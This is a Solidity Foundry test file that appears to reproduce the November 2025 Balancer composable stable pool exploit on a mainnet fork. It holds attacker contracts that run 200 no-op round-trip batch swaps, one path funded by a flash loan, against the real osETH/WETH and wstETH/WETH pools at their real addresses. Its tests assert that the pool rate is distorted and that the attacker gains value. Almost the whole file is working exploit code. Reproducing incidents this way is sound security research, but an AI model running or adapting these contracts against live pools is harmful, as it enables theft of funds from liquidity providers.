// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAsset {}

interface IBalancerVault {
    enum SwapKind {
        GIVEN_IN,
        GIVEN_OUT
    }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external returns (int256[] memory assetDeltas);

    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IComposableStablePool {
    function getPoolId() external view returns (bytes32);
    function getRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getActualSupply() external view returns (uint256);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract NoopSwapAttacker {
    IBalancerVault public immutable vault;
    address public immutable weth;

    constructor(address vault_, address weth_) {
        vault = IBalancerVault(vault_);
        weth = weth_;
    }

    function executeRoundTripBatchSwaps(
        bytes32 poolId,
        address tokenIn,
        address tokenMid,
        uint256 count,
        uint256 amountIn
    ) external {
        IERC20Like(weth).approve(address(vault), type(uint256).max);

        IERC20Like(tokenIn).approve(address(vault), type(uint256).max);
        IERC20Like(tokenMid).approve(address(vault), type(uint256).max);

        // Build repeated A->B->A round-trips in a single batch.
        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](count * 2);
        for (uint256 i = 0; i < count; i++) {
            uint256 j = i * 2;
            // A -> B
            steps[j] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: amountIn,
                userData: ""
            });
            // B -> A using previous amount from step[j]
            steps[j + 1] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: 0,
                userData: ""
            });
        }

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(tokenIn);
        assets[1] = IAsset(tokenMid);

        int256[] memory limits = new int256[](2);
        limits[0] = int256(uint256(type(uint128).max));
        limits[1] = int256(uint256(type(uint128).max));

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        vault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_IN,
            steps,
            assets,
            funds,
            limits,
            block.timestamp + 1 days
        );
    }
}

contract FlashLoanNoopAttacker is IFlashLoanRecipient {
    IBalancerVault public immutable vault;
    address public immutable weth;

    constructor(address vault_, address weth_) {
        vault = IBalancerVault(vault_);
        weth = weth_;
    }

    function executeWithFlashLoan(
        bytes32 firstPoolId,
        bytes32 secondPoolId,
        address firstMidToken,
        address secondMidToken,
        uint256 count,
        uint256 amount,
        uint256 loanAmount
    ) external {
        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(weth);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        bytes memory data = abi.encode(firstPoolId, secondPoolId, firstMidToken, secondMidToken, count, amount);
        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, data);

        uint256 residue = IERC20Like(weth).balanceOf(address(this));
        if (residue > 0) {
            IERC20Like(weth).transfer(msg.sender, residue);
        }
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(vault), "only vault");
        require(tokens.length == 1, "unexpected token count");
        require(address(tokens[0]) == weth, "unexpected token");

        (
            bytes32 firstPoolId,
            bytes32 secondPoolId,
            address firstMidToken,
            address secondMidToken,
            uint256 count,
            uint256 amount
        ) = abi.decode(userData, (bytes32, bytes32, address, address, uint256, uint256));

        IERC20Like(weth).approve(address(vault), type(uint256).max);
        _runRoundTripBatchSwaps(firstPoolId, weth, firstMidToken, count, amount);
        _runRoundTripBatchSwaps(secondPoolId, weth, secondMidToken, count, amount);

        uint256 amountOwed = amounts[0] + feeAmounts[0];
        IERC20Like(weth).transfer(address(vault), amountOwed);
    }

    function _runRoundTripBatchSwaps(
        bytes32 poolId,
        address tokenIn,
        address tokenMid,
        uint256 count,
        uint256 amountIn
    ) internal {
        IERC20Like(tokenIn).approve(address(vault), type(uint256).max);
        IERC20Like(tokenMid).approve(address(vault), type(uint256).max);

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](count * 2);
        for (uint256 i = 0; i < count; i++) {
            uint256 j = i * 2;
            steps[j] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: amountIn,
                userData: ""
            });
            steps[j + 1] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: 0,
                userData: ""
            });
        }

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(tokenIn);
        assets[1] = IAsset(tokenMid);

        int256[] memory limits = new int256[](2);
        limits[0] = int256(uint256(type(uint128).max));
        limits[1] = int256(uint256(type(uint128).max));

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        vault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_IN,
            steps,
            assets,
            funds,
            limits,
            block.timestamp + 1 days
        );
    }
}

contract BalancerComposableStableIncident20251103Test is Test {
    uint256 internal constant ONE = 1e18;

    // Ethereum mainnet
    uint256 internal constant CHAIN_ID = 1;

    // Stage-1 exploit transaction block: 23717397
    // We fork the block right before the attack.
    uint256 internal constant FORK_BLOCK = 23717396;

    // Core protocol contracts
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant OSETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // Affected composable stable pools from the 2025-11-03 incident.
    address internal constant OSETH_WETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address internal constant WSTETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;

    // Amount reported by multiple analyses as per-step no-op swap size in stage-1.
    uint256 internal constant NOOP_SWAP_AMOUNT = 128370411097832943; // 0.128370411097832943 WETH
    uint256 internal constant NOOP_SWAP_COUNT = 200;

    IComposableStablePool internal osEthPool;
    IComposableStablePool internal wstEthPool;
    IBalancerVault internal vault;

    address internal attackerEoa;
    NoopSwapAttacker internal attacker;
    FlashLoanNoopAttacker internal flashLoanAttacker;
    bool internal forkReady;

    struct PoolSnapshot {
        uint256 rate;
        uint256 totalSupply;
        uint256 actualSupply;
        uint256 wethBalance;
        address owner;
    }

    function setUp() public {
        string memory rpc = vm.envOr("MAINNET_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            emit log("MAINNET_RPC_URL is not set. Skipping fork-dependent PoC tests.");
            return;
        }

        uint256 forkId = vm.createFork(rpc, FORK_BLOCK);
        vm.selectFork(forkId);
        if (block.chainid != CHAIN_ID) {
            emit log_named_uint("MAINNET_RPC_URL chainId", block.chainid);
            emit log("Use Ethereum mainnet RPC, e.g. https://mainnet.infura.io/v3/<key>");
            return;
        }

        osEthPool = IComposableStablePool(OSETH_WETH_BPT);
        wstEthPool = IComposableStablePool(WSTETH_WETH_BPT);
        vault = IBalancerVault(BALANCER_VAULT);

        attackerEoa = makeAddr("attacker_eoa");
        attacker = new NoopSwapAttacker(BALANCER_VAULT, WETH);
        flashLoanAttacker = new FlashLoanNoopAttacker(BALANCER_VAULT, WETH);
        forkReady = true;
    }

    function test_poc_permissionlessInvariantBreak_byNoopBatchSwaps() public {
        if (!forkReady) return;

        PoolSnapshot memory osBefore = _snapshot(osEthPool);
        PoolSnapshot memory wstBefore = _snapshot(wstEthPool);

        // Unprivileged caller constraint.
        assertTrue(attackerEoa != osBefore.owner, "attacker unexpectedly os pool owner");
        assertTrue(attackerEoa != wstBefore.owner, "attacker unexpectedly wst pool owner");

        vm.startPrank(attackerEoa);
        deal(WETH, address(attacker), 1_000 ether);
        attacker.executeRoundTripBatchSwaps(osEthPool.getPoolId(), WETH, OSETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
        attacker.executeRoundTripBatchSwaps(wstEthPool.getPoolId(), WETH, WSTETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
        vm.stopPrank();

        PoolSnapshot memory osAfter = _snapshot(osEthPool);
        PoolSnapshot memory wstAfter = _snapshot(wstEthPool);

        emit log_named_uint("osEth/WETH rate before", osBefore.rate);
        emit log_named_uint("osEth/WETH rate after", osAfter.rate);
        emit log_named_uint("wstEth/WETH rate before", wstBefore.rate);
        emit log_named_uint("wstEth/WETH rate after", wstAfter.rate);

        // PoC success criterion: nominally neutral operations changed accounting state.
        assertTrue(_invariantBroken(osBefore, osAfter), "osEth pool invariant not broken");
        assertTrue(_invariantBroken(wstBefore, wstAfter), "wstEth pool invariant not broken");

        // Ownership did not change; this is not an owner-takeover exploit.
        assertEq(osAfter.owner, osBefore.owner, "osEth owner changed");
        assertEq(wstAfter.owner, wstBefore.owner, "wstEth owner changed");
    }

    function test_flashLoanCallbackPath_observeOutcome() public {
        if (!forkReady) return;

        PoolSnapshot memory osBefore = _snapshot(osEthPool);
        PoolSnapshot memory wstBefore = _snapshot(wstEthPool);

        vm.prank(attackerEoa);
        (bool ok, bytes memory ret) = address(flashLoanAttacker).call(
            abi.encodeCall(
                FlashLoanNoopAttacker.executeWithFlashLoan,
                (
                    osEthPool.getPoolId(),
                    wstEthPool.getPoolId(),
                    OSETH,
                    WSTETH,
                    NOOP_SWAP_COUNT,
                    NOOP_SWAP_AMOUNT,
                    8_250 ether
                )
            )
        );

        if (!ok) {
            emit log_named_string("flash-loan path reverted", _decodeRevertString(ret));
            return;
        }

        PoolSnapshot memory osAfter = _snapshot(osEthPool);
        PoolSnapshot memory wstAfter = _snapshot(wstEthPool);
        assertTrue(_invariantBroken(osBefore, osAfter) || _invariantBroken(wstBefore, wstAfter), "flash-loan path no-op");
    }

    function test_poc_mtmProfitAfterRateDistortion() public {
        if (!forkReady) return;

        uint256 seedWeth = 100 ether;
        uint256 osRateBefore = osEthPool.getRate();

        deal(WETH, attackerEoa, seedWeth);
        vm.startPrank(attackerEoa);
        IERC20Like(WETH).approve(BALANCER_VAULT, type(uint256).max);
        IERC20Like(OSETH_WETH_BPT).approve(BALANCER_VAULT, type(uint256).max);

        uint256 bptAcquired = _swapExactIn(osEthPool.getPoolId(), WETH, OSETH_WETH_BPT, seedWeth, attackerEoa);
        vm.stopPrank();

        vm.startPrank(attackerEoa);
        deal(WETH, address(attacker), 1_000 ether);
        attacker.executeRoundTripBatchSwaps(osEthPool.getPoolId(), WETH, OSETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
        attacker.executeRoundTripBatchSwaps(wstEthPool.getPoolId(), WETH, WSTETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
        vm.stopPrank();

        uint256 osRateAfter = osEthPool.getRate();
        uint256 mtmBefore = (bptAcquired * osRateBefore) / ONE;
        uint256 mtmAfter = (bptAcquired * osRateAfter) / ONE;

        // Full unwind may hit pool math/ratio guards on some providers; try partial unwind.
        uint256 unwindIn = bptAcquired / 10;
        vm.prank(attackerEoa);
        (bool unwindOk, bytes memory unwindRet) = address(this).call(
            abi.encodeCall(this.swapExactInAsSender, (osEthPool.getPoolId(), OSETH_WETH_BPT, WETH, unwindIn))
        );

        emit log_named_uint("attacker BPT acquired", bptAcquired);
        emit log_named_uint("osEth rate before", osRateBefore);
        emit log_named_uint("osEth rate after", osRateAfter);
        emit log_named_uint("attacker MTM before (WETH-denominated)", mtmBefore);
        emit log_named_uint("attacker MTM after  (WETH-denominated)", mtmAfter);
        if (unwindOk) {
            uint256 unwindWeth = abi.decode(unwindRet, (uint256));
            int256 realizedPnl = int256(unwindWeth) - int256(seedWeth / 10);
            emit log_named_int("attacker realized pnl from 10% unwind (WETH)", realizedPnl);
        } else {
            emit log_named_string("partial unwind reverted", _decodeRevertString(unwindRet));
        }
        assertGt(mtmAfter, mtmBefore, "no attacker MTM gain");
    }

    function _snapshot(IComposableStablePool pool) internal view returns (PoolSnapshot memory s) {
        s.rate = pool.getRate();
        s.totalSupply = pool.totalSupply();
        s.actualSupply = pool.getActualSupply();
        s.wethBalance = IERC20Like(WETH).balanceOf(address(pool));
        s.owner = _readOwner(address(pool));
    }

    function _invariantBroken(PoolSnapshot memory before_, PoolSnapshot memory after_)
        internal
        pure
        returns (bool)
    {
        bool rateMoved = before_.rate != after_.rate;
        bool supplyMoved = before_.totalSupply != after_.totalSupply || before_.actualSupply != after_.actualSupply;
        bool reserveMoved = before_.wethBalance != after_.wethBalance;
        return rateMoved || supplyMoved || reserveMoved;
    }

    function _swapExactIn(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn, address actor)
        internal
        returns (uint256 amountOut)
    {
        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](1);
        steps[0] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: amountIn,
            userData: ""
        });

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(tokenIn);
        assets[1] = IAsset(tokenOut);

        int256[] memory limits = new int256[](2);
        limits[0] = int256(uint256(type(uint128).max));
        limits[1] = int256(uint256(type(uint128).max));

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: actor,
            fromInternalBalance: false,
            recipient: payable(actor),
            toInternalBalance: false
        });

        int256[] memory deltas =
            vault.batchSwap(IBalancerVault.SwapKind.GIVEN_IN, steps, assets, funds, limits, block.timestamp + 1 days);

        require(deltas.length == 2, "unexpected deltas length");
        require(deltas[1] < 0, "expected tokenOut credit");
        amountOut = uint256(-deltas[1]);
    }

    function swapExactInAsSender(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn)
        external
        returns (uint256 amountOut)
    {
        amountOut = _swapExactIn(poolId, tokenIn, tokenOut, amountIn, msg.sender);
    }

    function _readOwner(address pool) internal view returns (address owner_) {
        // Some Balancer pool implementations expose getOwner(), others owner().
        // We probe both and tolerate absence to avoid false-negative test reverts.
        (bool ok, bytes memory out) = pool.staticcall(abi.encodeWithSignature("getOwner()"));
        if (ok && out.length >= 32) {
            owner_ = abi.decode(out, (address));
            return owner_;
        }

        (ok, out) = pool.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && out.length >= 32) {
            owner_ = abi.decode(out, (address));
            return owner_;
        }

        return address(0);
    }

    function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) return "empty/short revert data";

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(revertData, 0x20)))
        }

        if (selector == 0x08c379a0) return "Error(string)";
        if (selector == 0x4e487b71) return "Panic(uint256)";
        return "custom/unknown error selector";
    }
}
